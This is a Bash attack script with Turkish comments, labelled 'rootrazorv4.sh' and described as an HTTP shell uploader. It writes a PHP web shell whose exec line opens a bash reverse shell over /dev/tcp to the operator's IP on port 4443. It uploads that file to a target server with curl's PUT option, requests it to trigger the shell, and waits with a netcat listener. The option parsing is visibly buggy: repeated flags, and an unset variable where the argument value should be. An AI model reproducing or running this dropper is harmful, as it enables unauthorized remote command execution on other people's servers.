#!/bin/bash        
#Baslik          :rootrazorv4.sh
#Aciklama    :http
#Gelistirici         :@rootrazor (https://github.com/rootrazor/)
#Version        :1.0    
#Kullanim          :./rootrazorv4.sh
#====================================================================================================

# --- Baslangic ---
sunucu=0
port=1337
yol=/
hedefsunucu=0
shelladi=rootrazor.php

# --- renkler ---
kirmizi="\033[1;31m"
yesil="\033[1;32m"
mavi="\033[1;34m"
renkyok="\033[0m"

# --- tanitim ---



echo -e "     .--. " 
echo -e "    |o_o |	 " 
echo -e "    |:_/ |   ========= http shell yükleyici ========= " 
echo -e "  //   \ \  ====== Code by RootRazor ====== " 
echo -e " (|     | ) ====== Thanks to Turkharekat ======= " 
echo -e " /\'\_   _/ " 
echo -e " \___)=(___/ " 

 
# --- kullanım ---
kullanim() { 
	echo -e "\nhttp yöntemi ile shell yükliyebilir veya index basabilirsiniz ."  | lolcat -a -d 100
	echo -e "\Ayarlar:\n  -s Sunucu        Sunucu URL/IP (Örnek "192.168.1.2") \n  -p PORT          Sunucu PORT (Örnek "1337") \n  -y URL YOL      kaydedilecek yol (örnek "/klosoradi")  \n  -h Lokal İP      Exploitin Baglanacagi İP (örnek. "192.168.1.3") \n  -s SHELL ADİ    Shell Adi (örnek "rootrazor.php")" 
	echo -e "\nOrnek Kullanim:\n - ./rootrazorv4.sh -s 192.168.1.2 -h 192.168.1.3 -s rootrazor.php" 
	echo -e " - ./rootrazorv4.sh -s 192.168.1.2 -p 1337 -y /hedefklasor -h 192.168.1.3\n" 
	} 

# --- fonksiyonlar ---
while getopts 's:p:y:h:s:h' alalim;
do
    case $alalim in
    	s) sunucu=$getir ;;
	p) port=$getir ;;
	y) yol=$getir ;;
	h) hedefsunucu=$getir ;;
	s) shelladi=$getir ;;
	esac
done

# --- değişkenler dörtten küçükse ise: kullanımı gösterir ve çıkar ---
if [ $# -lt 4 ] 
then
	kullanim
	exit 1
fi 

# --- ana bölüm ---
if [ -e $shelladi ]
then
	rm -r $shelladi
fi

echo -e "${mavi}[+] Shell Olusturuluyor...${renkyok}"
echo -e "<?php" > $shelladi
echo -e "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$hedefsunucu/4443 0>&1'\");" >> $shelladi
echo -e "${yesil}[+] Shell '$shelladi' Oluşturuldu!${renkyok}"

echo -e "${mavi}[+] Shell Şu Dizine Yükleniyor $sunucu:$port$yol...${renkyok}"
curl=$(curl -v -T $shelladi http://$sunucu:$port$yol 2>&1 | grep Devam) 
if [ -z "$curl" ]
then
	echo -e "${kirmizi}[-] Shell Yüklenemedi!${renkyok}"
	exit 1
fi

echo -e "${yesil}[+] Shell Su Linke Basari İle Yüklendi http://$sunucu:$port$yol/$shelladi !${renkyok}"
echo -e "${mavi}[+] Lütfen Bekleyin Sunucuya Erişiliyor...${renkyok}"

curl http://$sunucu:$port$yol/$shelladi &
nc -lvp 4443
